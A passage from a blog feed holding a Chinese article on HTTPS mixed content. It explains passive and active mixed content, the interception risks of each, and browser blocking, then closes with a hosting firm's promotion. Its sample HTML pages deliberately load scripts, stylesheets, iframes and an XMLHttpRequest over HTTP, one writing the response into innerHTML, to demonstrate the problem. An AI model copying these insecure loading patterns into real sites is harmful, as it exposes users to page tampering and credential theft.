-moz-opacity: 0.8;</span><br><span class="line">        -khtml-opacity: 0.8;</span><br><span class="line">        opacity: 0.8;</span><br><span class="line">        z-index: 10000;</span><br><span class="line">      &#125;</span><br><span class="line">      .overlay-foreground &#123;</span><br><span class="line">        background-position: center center;</span><br><span class="line">        background-repeat: no-repeat;</span><br><span class="line">        z-index: 10001;</span><br><span class="line">      &#125;</span><br><span class="line">    &lt;&#x2F;style&gt;</span><br><span class="line">  &lt;&#x2F;head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;div role&#x3D;&quot;main&quot;&gt;</span><br><span class="line">      &lt;h1&gt;</span><br><span class="line">        Image gallery mixed content!</span><br><span class="line">      &lt;&#x2F;h1&gt;</span><br><span class="line">      &lt;p&gt;</span><br><span class="line">        View page over: &lt;a href&#x3D;&quot;http:&#x2F;&#x2F;googlesamples.github.io&#x2F;web-fundamentals&#x2F;fundamentals&#x2F;security&#x2F;prevent-mixed-content&#x2F;image-gallery-example.html&quot;&gt;HTTP&lt;&#x2F;a&gt; - &lt;a href&#x3D;&quot;https:&#x2F;&#x2F;googlesamples.github.io&#x2F;web-fundamentals&#x2F;fundamentals&#x2F;security&#x2F;prevent-mixed-content&#x2F;image-gallery-example.html&quot;&gt;HTTPS&lt;&#x2F;a&gt;</span><br><span class="line">      &lt;&#x2F;p&gt;</span><br><span class="line">      &lt;p&gt;</span><br><span class="line">        Image galleries often rely on the &lt;img&gt; tag src attribute to display thumbnail images on the page, the anchor ( &lt;a&gt; ) tag href attribute is then used to load the full sized image for the gallery overlay. Normally &lt;a&gt; tags do not cause mixed content, but in this case the jQuery code overrides the default link behavior &amp;mdash; to navigate to a new page &amp;mdash; and instead loads the HTTP image on this page. While this content isn&#39;t blocked, modern browsers display a warning in the JavaScript console. This can be seen when the page is viewed over HTTPS and the thumbnail is clicked.</span><br><span class="line">      &lt;&#x2F;p&gt;</span><br><span class="line">      CLICK ME! --&gt;</span><br><span class="line">      &lt;a class&#x3D;&quot;gallery&quot; href&#x3D;&quot;http:&#x2F;&#x2F;googlesamples.github.io&#x2F;web-fundamentals&#x2F;fundamentals&#x2F;security&#x2F;prevent-mixed-content&#x2F;puppy.jpg&quot;&gt;</span><br><span class="line">        &lt;img src&#x3D;&quot;https:&#x2F;&#x2F;googlesamples.github.io&#x2F;web-fundamentals&#x2F;fundamentals&#x2F;security&#x2F;prevent-mixed-content&#x2F;puppy-thumb.jpg&quot;&gt;</span><br><span class="line">      &lt;&#x2F;a&gt;</span><br><span class="line">      &lt;div class&#x3D;&quot;overlay overlay-background&quot; style&#x3D;&quot;display: none;&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">      &lt;div class&#x3D;&quot;overlay overlay-foreground&quot; style&#x3D;&quot;display: none;&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">  (function(b,o,i,l,e,r)&#123;b.GoogleAnalyticsObject&#x3D;l;b[l]||(b[l]&#x3D;</span><br><span class="line">  function()&#123;(b[l].q&#x3D;b[l].q||[]).push(arguments)&#125;);b[l].l&#x3D;+new Date;</span><br><span class="line">  e&#x3D;o.createElement(i);r&#x3D;o.getElementsByTagName(i)[0];</span><br><span class="line">  e.src&#x3D;&#39;&#x2F;&#x2F;www.google-analytics.com&#x2F;analytics.js&#39;;</span><br><span class="line">  r.parentNode.insertBefore(e,r)&#125;(window,document,&#39;script&#39;,&#39;ga&#39;));</span><br><span class="line">  ga(&#39;create&#39;,&#39;UA-52746336-1&#39;);ga(&#39;send&#39;,&#39;pageview&#39;);</span><br><span class="line">  var isCompleted &#x3D; &#123;&#125;;</span><br><span class="line">  function sampleCompleted(sampleName)&#123;</span><br><span class="line">    if (ga &amp;&amp; !isCompleted.hasOwnProperty(sampleName)) &#123;</span><br><span class="line">      ga(&#39;send&#39;, &#39;event&#39;, &#39;WebCentralSample&#39;, sampleName, &#39;completed&#39;);</span><br><span class="line">      isCompleted[sampleName] &#x3D; true;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">  &lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p><a href="https://googlesamples.github.io/web-fundamentals/fundamentals/security/prevent-mixed-content/image-gallery-example.html">试一下</a></p><p>图像库通常依靠 <code>&lt;img&gt;</code> 标记 <code>src</code> 属性在页面上显示缩略图，然后，使用定位 (<code>&lt;a&gt;</code>) 标记 <code>href</code> 属性为图像库叠加层加载完整尺寸的图像。正常情况下，<code>&lt;a&gt;</code> 标记不会产生混合内容，但在此例中，jQuery 代码替换默认链接行为（导航到新页面），改为在此页面上加载 <strong>HTTP</strong> 图像。</p><p><img src="https://developers.google.com/web/fundamentals/security/prevent-mixed-content/imgs/image-gallery-warning.png?hl=zh-cn" alt="混合内容：页面已通过 HTTPS 加载，但请求了不安全的图像。此内容也应通过 HTTPS 提供。"></p><p>不安全的图像会降低网站的安全性，但是它们的危险性与其他类型的混合内容不一样。 现代浏览器仍会加载混合内容图像，但也会向用户显示警告。</p><h2 id="混合内容类型与相关安全威胁"><a href="#混合内容类型与相关安全威胁" class="headerlink" title="混合内容类型与相关安全威胁"></a>混合内容类型与相关安全威胁</h2><p>混合内容有两种：主动混合内容和被动混合内容</p><p><strong>被动混合内容</strong>指的是不与页面其余部分进行交互的内容，从而使中间人攻击在拦截或更改该内容时能够执行的操作受限。被动混合内容包括图像、视频和音频内容，以及无法与页面其余部分进行交互的其他资源。</p><p><strong>主动混合内容</strong>作为整体与页面进行交互，并且几乎允许攻击者对页面进行任何操作。 主动混合内容包括浏览器可下载和执行的脚本、样式表、iframe、flash 资源及其他代码。</p><h3 id="被动混合内容"><a href="#被动混合内容" class="headerlink" title="被动混合内容"></a>被动混合内容</h3><p>被动混合内容仍会给您的网站和用户带来安全威胁。 例如，攻击者可以拦截针对网站上的图像的 HTTP 请求，调换或更换这些图像；此攻击者可以调换“save and delete”按钮图像，导致您的用户无意间删除内容；将您的产品图表更换为下流或淫秽内容，从而损害您的网站；或将您的产品图像更换为不同网站或产品的广告。</p><p>即使攻击者不改变您的网站内容，您仍面临严重的隐私问题，攻击者可以使用混合内容请求跟踪用户。攻击者可以基于浏览器加载的图像或其他资源了解用户访问哪些页面，以及查看了哪些产品。</p><p>以下是被动混合内容的示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;IE&#x3D;edge&quot;&gt;</span><br><span class="line">    &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1&quot;&gt;</span><br><span class="line">    &lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;https:&#x2F;&#x2F;fonts.googleapis.com&#x2F;icon?family&#x3D;Material+Icons&quot;&gt;</span><br><span class="line">    &lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;https:&#x2F;&#x2F;code.getmdl.io&#x2F;1.2.1&#x2F;material.indigo-pink.min.css&quot;&gt;</span><br><span class="line">    &lt;script defer src&#x3D;&quot;https:&#x2F;&#x2F;code.getmdl.io&#x2F;1.2.1&#x2F;material.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">      body &#123;</span><br><span class="line">        margin: 2em;</span><br><span class="line">      &#125;</span><br><span class="line">    &lt;&#x2F;style&gt;</span><br><span class="line">    &lt;title&gt;Passive mixed content example&lt;&#x2F;title&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">      audio, img, video &#123;</span><br><span class="line">        display: block;</span><br><span class="line">        margin: 10px;</span><br><span class="line">      &#125;</span><br><span class="line">    &lt;&#x2F;style&gt;</span><br><span class="line">  &lt;&#x2F;head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;div role&#x3D;&quot;main&quot;&gt;</span><br><span class="line">      &lt;h1&gt;</span><br><span class="line">        Passive mixed content!</span><br><span class="line">      &lt;&#x2F;h1&gt;</span><br><span class="line">      &lt;p&gt;</span><br><span class="line">        View page over: &lt;a href&#x3D;&quot;http:&#x2F;&#x2F;googlesamples.github.io&#x2F;web-fundamentals&#x2F;fundamentals&#x2F;security&#x2F;prevent-mixed-content&#x2F;passive-mixed-content.html&quot;&gt;HTTP&lt;&#x2F;a&gt; - &lt;a href&#x3D;&quot;https:&#x2F;&#x2F;googlesamples.github.io&#x2F;web-fundamentals&#x2F;fundamentals&#x2F;security&#x2F;prevent-mixed-content&#x2F;passive-mixed-content.html&quot;&gt;HTTPS&lt;&#x2F;a&gt;</span><br><span class="line">      &lt;&#x2F;p&gt;</span><br><span class="line">      &lt;p&gt;</span><br><span class="line">        Several examples of passive mixed content. When viewed over HTTPS most browsers do &lt;b&gt;not&lt;&#x2F;b&gt; block this content but instead display warnings in the JavaScript console.</span><br><span class="line">      &lt;&#x2F;p&gt;</span><br><span class="line"></span><br><span class="line">      &lt;!-- An insecure audio file loaded on a secure page --&gt;</span><br><span class="line">      &lt;audio src&#x3D;&quot;http:&#x2F;&#x2F;googlesamples.github.io&#x2F;web-fundamentals&#x2F;fundamentals&#x2F;security&#x2F;prevent-mixed-content&#x2F;sleep.mp3&quot; type&#x3D;&quot;audio&#x2F;mp3&quot; controls&gt;&lt;&#x2F;audio&gt;</span><br><span class="line"></span><br><span class="line">      &lt;!-- An insecure image loaded on a secure page --&gt;</span><br><span class="line">      &lt;img src&#x3D;&quot;http:&#x2F;&#x2F;googlesamples.github.io&#x2F;web-fundamentals&#x2F;fundamentals&#x2F;security&#x2F;prevent-mixed-content&#x2F;puppy.jpg&quot;&gt;</span><br><span class="line"></span><br><span class="line">      &lt;!-- An insecure video file loaded on a secure page --&gt;</span><br><span class="line">      &lt;video src&#x3D;&quot;http:&#x2F;&#x2F;storage.googleapis.com&#x2F;webfundamentals-assets&#x2F;videos&#x2F;chrome.webm&quot; type&#x3D;&quot;video&#x2F;webm&quot; controls&gt;&lt;&#x2F;video&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">  (function(b,o,i,l,e,r)&#123;b.GoogleAnalyticsObject&#x3D;l;b[l]||(b[l]&#x3D;</span><br><span class="line">  function()&#123;(b[l].q&#x3D;b[l].q||[]).push(arguments)&#125;);b[l].l&#x3D;+new Date;</span><br><span class="line">  e&#x3D;o.createElement(i);r&#x3D;o.getElementsByTagName(i)[0];</span><br><span class="line">  e.src&#x3D;&#39;&#x2F;&#x2F;www.google-analytics.com&#x2F;analytics.js&#39;;</span><br><span class="line">  r.parentNode.insertBefore(e,r)&#125;(window,document,&#39;script&#39;,&#39;ga&#39;));</span><br><span class="line">  ga(&#39;create&#39;,&#39;UA-52746336-1&#39;);ga(&#39;send&#39;,&#39;pageview&#39;);</span><br><span class="line">  var isCompleted &#x3D; &#123;&#125;;</span><br><span class="line">  function sampleCompleted(sampleName)&#123;</span><br><span class="line">    if (ga &amp;&amp; !isCompleted.hasOwnProperty(sampleName)) &#123;</span><br><span class="line">      ga(&#39;send&#39;, &#39;event&#39;, &#39;WebCentralSample&#39;, sampleName, &#39;completed&#39;);</span><br><span class="line">      isCompleted[sampleName] &#x3D; true;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">  &lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p><a href="https://googlesamples.github.io/web-fundamentals/fundamentals/security/prevent-mixed-content/passive-mixed-content.html">试一下</a></p><p>大多数浏览器仍向用户渲染此类型的混合内容，但是也会显示警告，因为这些内容会给您的网站和用户带来安全风险和隐私风险。</p><p><img src="https://developers.google.com/web/fundamentals/security/prevent-mixed-content/imgs/passive-mixed-content-warnings.png?hl=zh-cn" alt="混合内容：页面已通过 HTTPS 加载，但请求了不安全的视频。此内容也应通过 HTTPS 提供。">来自 Chrome JavaScript 控制台的混合内容警告。</p><h3 id="主动混合内容"><a href="#主动混合内容" class="headerlink" title="主动混合内容"></a>主动混合内容</h3><p>与被动混合内容相比，主动混合内容造成的威胁更大。攻击者可以拦截和重写主动内容，从而完全控制页面，甚至整个网站。这让攻击者可以更改有关页面的任何内容，包括显示完全不同的内容、窃取用户密码或其他登录凭据、窃取用户会话 Cookie，或将用户重定向到一个完全不同的网站。</p><p>鉴于这种威胁的严重性，许多浏览器都会默认阻止此类型的内容以保护用户，但是其作用因浏览器供应商和版本而有所差异。</p><p>以下包含主动混合内容的示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;IE&#x3D;edge&quot;&gt;</span><br><span class="line">    &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1&quot;&gt;</span><br><span class="line">    &lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;https:&#x2F;&#x2F;fonts.googleapis.com&#x2F;icon?family&#x3D;Material+Icons&quot;&gt;</span><br><span class="line">    &lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;https:&#x2F;&#x2F;code.getmdl.io&#x2F;1.2.1&#x2F;material.indigo-pink.min.css&quot;&gt;</span><br><span class="line">    &lt;script defer src&#x3D;&quot;https:&#x2F;&#x2F;code.getmdl.io&#x2F;1.2.1&#x2F;material.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">      body &#123;</span><br><span class="line">        margin: 2em;</span><br><span class="line">      &#125;</span><br><span class="line">    &lt;&#x2F;style&gt;</span><br><span class="line">    &lt;title&gt;Active mixed content example&lt;&#x2F;title&gt;</span><br><span class="line">    &lt;!-- An insecure script file loaded on a secure page --&gt;</span><br><span class="line">    &lt;script src&#x3D;&quot;http:&#x2F;&#x2F;googlesamples.github.io&#x2F;web-fundamentals&#x2F;fundamentals&#x2F;security&#x2F;prevent-mixed-content&#x2F;simple-example.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- An insecure stylesheet loaded on a secure page --&gt;</span><br><span class="line">    &lt;link href&#x3D;&quot;http:&#x2F;&#x2F;googlesamples.github.io&#x2F;web-fundamentals&#x2F;fundamentals&#x2F;security&#x2F;prevent-mixed-content&#x2F;style.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;style&gt;</span><br><span class="line">      .insecure-background &#123;</span><br><span class="line">        &#x2F;* An insecure resources loaded from a style property on a secure page, this can</span><br><span class="line">           happen in many places including, @font-face, cursor, background-image, and so on. *&#x2F;</span><br><span class="line">        background: url(&#39;http:&#x2F;&#x2F;googlesamples.github.io&#x2F;web-fundamentals&#x2F;fundamentals&#x2F;security&#x2F;prevent-mixed-content&#x2F;puppy-thumb.jpg&#39;) no-repeat;</span><br><span class="line">      &#125;</span><br><span class="line">    &lt;&#x2F;style&gt;</span><br><span class="line"></span><br><span class="line">    &lt;style&gt;</span><br><span class="line">      .insecure-style-holder span &#123;</span><br><span class="line">        color: #fff;</span><br><span class="line">      &#125;</span><br><span class="line">      .insecure-background &#123;</span><br><span class="line">        color: #000;</span><br><span class="line">        font-weight: bold;</span><br><span class="line">        background-position: left center;</span><br><span class="line">        background-repeat: no-repeat;</span><br><span class="line">        width: 300px;</span><br><span class="line">        height: 140px;</span><br><span class="line">      &#125;</span><br><span class="line">      iframe &#123;</span><br><span class="line">        width: 400px;</span><br><span class="line">        height: 300px;</span><br><span class="line">      &#125;</span><br><span class="line">    &lt;&#x2F;style&gt;</span><br><span class="line"></span><br><span class="line">  &lt;&#x2F;head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;div role&#x3D;&quot;main&quot;&gt;</span><br><span class="line">      &lt;h1&gt;</span><br><span class="line">        Active mixed content!</span><br><span class="line">      &lt;&#x2F;h1&gt;</span><br><span class="line">      &lt;p&gt;</span><br><span class="line">        View page over: &lt;a href&#x3D;&quot;http:&#x2F;&#x2F;googlesamples.github.io&#x2F;web-fundamentals&#x2F;fundamentals&#x2F;security&#x2F;prevent-mixed-content&#x2F;active-mixed-content.html&quot;&gt;HTTP&lt;&#x2F;a&gt; - &lt;a href&#x3D;&quot;https:&#x2F;&#x2F;googlesamples.github.io&#x2F;web-fundamentals&#x2F;fundamentals&#x2F;security&#x2F;prevent-mixed-content&#x2F;active-mixed-content.html&quot;&gt;HTTPS&lt;&#x2F;a&gt;</span><br><span class="line">      &lt;&#x2F;p&gt;</span><br><span class="line">      &lt;p&gt;</span><br><span class="line">        Several examples of active mixed content. When viewed over HTTPS most browsers block this content and display errors in the JavaScript console.</span><br><span class="line">      &lt;&#x2F;p&gt;</span><br><span class="line">      &lt;div class&#x3D;&quot;insecure-style-holder&quot;&gt;</span><br><span class="line">        &lt;span style&#x3D;&quot;ba&quot;&gt;Insecure style loaded&lt;&#x2F;span&gt;</span><br><span class="line">      &lt;&#x2F;div&gt;</span><br><span class="line">      &lt;div class&#x3D;&quot;insecure-background&quot;&gt;</span><br><span class="line">        Loading insecure background here...</span><br><span class="line">      &lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line">      &lt;p&gt;Loading insecure iframe...&lt;&#x2F;p&gt;</span><br><span class="line">      &lt;!-- An insecure iframed page loaded on a secure page --&gt;</span><br><span class="line">      &lt;iframe src&#x3D;&quot;http:&#x2F;&#x2F;googlesamples.github.io&#x2F;web-fundamentals&#x2F;fundamentals&#x2F;security&#x2F;prevent-mixed-content&#x2F;image-gallery-example.html&quot;&gt;&lt;&#x2F;iframe&gt;</span><br><span class="line"></span><br><span class="line">      &lt;!-- Flash resources also qualify as active mixed content and pose a</span><br><span class="line">      serious security risk. Be sure to look for &lt;object&gt; tags with type set</span><br><span class="line">      to &quot;application&#x2F;x-shockwave-flash&quot;, and an http:&#x2F;&#x2F; data attribute. --&gt;</span><br><span class="line">      &lt;!-- &lt;object type&#x3D;&quot;application&#x2F;x-shockwave-flash&quot; data&#x3D;&quot;http:&#x2F;&#x2F;...&quot;&gt;&lt;&#x2F;object&gt; --&gt;</span><br><span class="line"></span><br><span class="line">      &lt;script&gt;</span><br><span class="line">        &#x2F;&#x2F; An insecure resource loaded using XMLHttpRequest</span><br><span class="line">        var request &#x3D; new XMLHttpRequest();</span><br><span class="line">        request.addEventListener(&#39;load&#39;, function() &#123;</span><br><span class="line">          var jsonData &#x3D; JSON.parse(request.responseText);</span><br><span class="line">          document.getElementById(&#39;output&#39;).innerHTML +&#x3D; &#39;&lt;br&gt;&#39; + jsonData.data;</span><br><span class="line">        &#125;);</span><br><span class="line">        request.open(&quot;GET&quot;, &quot;http:&#x2F;&#x2F;googlesamples.github.io&#x2F;web-fundamentals&#x2F;fundamentals&#x2F;security&#x2F;prevent-mixed-content&#x2F;xmlhttprequest-data.js&quot;, true);</span><br><span class="line">        request.send();</span><br><span class="line">      &lt;&#x2F;script&gt;</span><br><span class="line">      &lt;div id&#x3D;&quot;output&quot;&gt;Waiting for insecure script to run...&lt;&#x2F;div&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">  (function(b,o,i,l,e,r)&#123;b.GoogleAnalyticsObject&#x3D;l;b[l]||(b[l]&#x3D;</span><br><span class="line">  function()&#123;(b[l].q&#x3D;b[l].q||[]).push(arguments)&#125;);b[l].l&#x3D;+new Date;</span><br><span class="line">  e&#x3D;o.createElement(i);r&#x3D;o.getElementsByTagName(i)[0];</span><br><span class="line">  e.src&#x3D;&#39;&#x2F;&#x2F;www.google-analytics.com&#x2F;analytics.js&#39;;</span><br><span class="line">  r.parentNode.insertBefore(e,r)&#125;(window,document,&#39;script&#39;,&#39;ga&#39;));</span><br><span class="line">  ga(&#39;create&#39;,&#39;UA-52746336-1&#39;);ga(&#39;send&#39;,&#39;pageview&#39;);</span><br><span class="line">  var isCompleted &#x3D; &#123;&#125;;</span><br><span class="line">  function sampleCompleted(sampleName)&#123;</span><br><span class="line">    if (ga &amp;&amp; !isCompleted.hasOwnProperty(sampleName)) &#123;</span><br><span class="line">      ga(&#39;send&#39;, &#39;event&#39;, &#39;WebCentralSample&#39;, sampleName, &#39;completed&#39;);</span><br><span class="line">      isCompleted[sampleName] &#x3D; true;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">  &lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p><a href="https://googlesamples.github.io/web-fundamentals/fundamentals/security/prevent-mixed-content/active-mixed-content.html">试一下</a></p><p><img src="https://developers.google.com/web/fundamentals/security/prevent-mixed-content/imgs/active-mixed-content-errors.png?hl=zh-cn" alt="混合内容：页面已通过 HTTPS 加载，但请求了不安全的资源。此请求已被阻止，内容必须通过 HTTPS 提供。">来自 Chrome JavaScript 控制台的混合内容错误。</p><h2 id="具有混合内容的浏览器行为"><a href="#具有混合内容的浏览器行为" class="headerlink" title="具有混合内容的浏览器行为"></a>具有混合内容的浏览器行为</h2><p>鉴于上述威胁，浏览器最好是阻止所有混合内容。 但是，这将破坏大量网站，而数百万用户每天都要访问这些网站。 当前的折衷做法是阻止最危险的混合内容类型，同时仍允许请求不太危险的混合内容类型。</p><p>现代浏览器遵循<a href="https://w3c.github.io/webappsec/specs/mixedcontent/">混合内容规范</a>，其定义了<a href="https://w3c.github.io/webappsec/specs/mixedcontent/#category-optionally-blockable"><strong>可选择性地阻止的内容</strong></a>和<a href="https://w3c.github.io/webappsec/specs/mixedcontent/#category-blockable"><strong>可阻止的内容</strong></a>类别。</p><p>根据此规范，“当破坏网络重要部分的风险超过允许此资源作为混合内容使用的风险时”，该资源有资格成为可选择性阻止的内容；这是上述<a href="https://developers.google.com/web/fundamentals/security/prevent-mixed-content/what-is-mixed-content?hl=zh-cn#passive-mixed-content">被动混合内容</a>类别的子集。在撰写本文时，可选择性阻止的内容中仅包括图像、视频和音频资源以及预获取的链接这些资源类型。随着时间的推移，此类别可能会缩小。</p><p><strong>可选择性阻止的内容</strong>以外的所有内容被视为<strong>可阻止的内容</strong>，将被浏览器阻止。</p><h3 id="浏览器版本"><a href="#浏览器版本" class="headerlink" title="浏览器版本"></a>浏览器版本</h3><p>切记，并不是网站的每个访问者都使用最新的浏览器。 不同浏览器供应商的不同版本的浏览器处理混合内容的方式不尽相同。 最糟糕的情况是，有些浏览器和版本根本不会阻止任何混合内容，这对于用户而言非常不安全。</p><p>每个浏览器的确切行为不断变化，因此，我们在这里不做具体介绍。 如果您对特定浏览器的行为方式感兴趣，请直接查看供应商发布的信息。</p><h3 id="缺少中间根证书"><a href="#缺少中间根证书" class="headerlink" title="缺少中间根证书"></a>缺少中间根证书</h3><p>还有一种情况是由于证书链不完整缺少中间根证书导致的。这个情况下<a href="https://www.bisend.cn/blog/ruhezhaodaosslzhengshudezhongjiangenzhengshu">找到SSL证书的中间根证书</a>、补全证书链再重新安装即可解决问题。</p><p>以上即为几种常见的导致SSL证书部署后仍出现不安全提示的原因。如果一一排查之后还是不能解决问题，或者处理过程中不知该如何操作，可提交工单或在线联系必盛云客服为您处理。</p><h3 id="相关文章："><a href="#相关文章：" class="headerlink" title="相关文章："></a>相关文章：</h3><ul><li><a href="https://www.bisend.cn/blog/comodozhengshuhebingjizhuanhuanjiaocheng">Comodo证书合并及转换教程</a></li><li><a href="https://www.bisend.cn/blog/digicertzhengshuhebingjizhuanhuanjiaocheng">Digicert、Symantec和Geotrust证书合并及转换教程</a></li><li><a href="https://www.bisend.cn/blog/shenqingsslzhengshuzenyangzuoyumingyanzheng">申请SSL证书怎样做域名验证</a></li><li><a href="https://www.bisend.cn/blog/ru-he-shen-qing-ov-ev-ssl-zheng-shu">如何申请OV/EV SSL 证书</a></li><li><a href="https://www.bisend.cn/blog/ruhebushusslzhengshu">如何部署SSL证书</a></li><li><a href="https://www.bisend.cn/blog/apachefuwuqianzhuangsslzhengshu">Apache服务器安装SSL证书</a></li><li><a href="https://www.bisend.cn/blog/ruhebeifenhuodaochusslzhengshu">如何备份或导出SSL证书</a></li><li><a href="https://www.bisend.cn/blog/ip-ssl-certificates">IP地址可以安装SSL证书吗？</a></li><li><a href="https://developers.google.com/web/fundamentals/security/prevent-mixed-content/what-is-mixed-content?hl=zh-cn">混合内容</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网站 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 服务器 </tag>
            
            <tag> ssl </tag>
            
            <tag> 网站 </tag>
            
            <tag> https </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nginx 配置</title>
      <link href="/Nginx%20%E9%85%8D%E7%BD%AE/"/>
      <url>/Nginx%20%E9%85%8D%E7%BD%AE/</url>
      
